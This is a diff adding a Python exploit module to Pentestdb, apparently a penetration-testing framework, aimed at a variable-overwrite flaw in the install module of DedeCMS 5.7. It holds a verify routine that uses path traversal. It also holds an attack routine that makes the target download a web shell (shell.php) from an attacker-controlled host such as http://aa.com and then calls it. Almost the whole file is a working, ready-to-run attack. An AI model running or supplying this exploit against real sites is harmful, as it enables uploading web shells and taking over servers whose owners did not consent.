@@ -1,0 +1,81 @@
+#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+
+'''
+Pentestdb, a database for penetration test.
+Copyright (c) 2015 alpha1e0
+'''
+
+
+from script.libs.exploit import Exploit
+from script.libs.exploit import Result
+
+
+
+class DedeVC(Exploit):
+    expName = u"dedecms 5.7 install模块变量覆盖任意代码上传执行"
+    version = "1.0"
+    author = "alpha1e0"
+    language = "php"
+    appName = "dedecms"
+    appVersion = "5.7"
+    reference = ['https://www.exploit-db.com/exploits/37423/']
+    description = u'''
+        install模块，变量覆盖，触发dedecms从远端下载任意文件
+        漏洞利用条件：1.dedecms5.7; 2.黑客控制公网IP
+        attack需要提供额外参数：--elseargs vulfile=shell.php#vulpath=http://aa.com
+    '''
+
+    def _verify(self):
+        result = Result(self)
+
+        sig = u"远程获取失败"
+        
+        self.params['step'] = "11"
+        self.params['insLockfile'] = "a"
+        self.params['s_lang'] = "a"
+        self.params['install_demo_name'] = "../data/admin/config_update.php"
+
+        url = self.urlJoin("/install/index.php")
+        response = self.http.get(url, params=self.params)
+
+        if response.status_code == 200:
+            if sig.encode('gbk') in response.content or sig.encode('utf-8') in response.content:
+                result['fullpath'] = url
+                result['payload'] = str(self.params)
+
+        return result
+
+
+    def _attack(self):
+        result = Result(self)
+
+        vulfile = self.args.get("vulfile",None)
+        vulpath = self.args.get("vulpath",None)
+
+        if not vulfile or not vulpath:
+            #print "Missing --elseargs, should be '--elseargs vulfile=shell.php#vulpath=http://aa.com'"
+            result['isvul'] = result.ERROR
+            result['elseinfo'] = "Missing --elseargs, should be '--elseargs vulfile=shell.php#vulpath=http://aa.com'"
+            return result
+
+        self.params['step'] = "11"
+        self.params['insLockfile'] = "a"
+        self.params['s_lang'] = "a"
+        self.params['install_demo_name'] = "../data/admin/config_update.php"
+
+        url = self.urlJoin("/install/index.php")
+        response1 = self.http.get(url, params=self.params)
+
+        self.params['install_demo_name'] = vulfile
+        self.params['updateHost'] = vulpath
+        response2 = self.http.get(url, params=self.params)
+
+        url = url.replace("index.php",vulfile)
+        response3 = self.http.get(url)
+        #print "debug>>>>>",response.request.url
+        #print "debug>>>>>",response.content
+        if response3.status_code == 200:
+            result['shellpath'] = url
+
+        return result
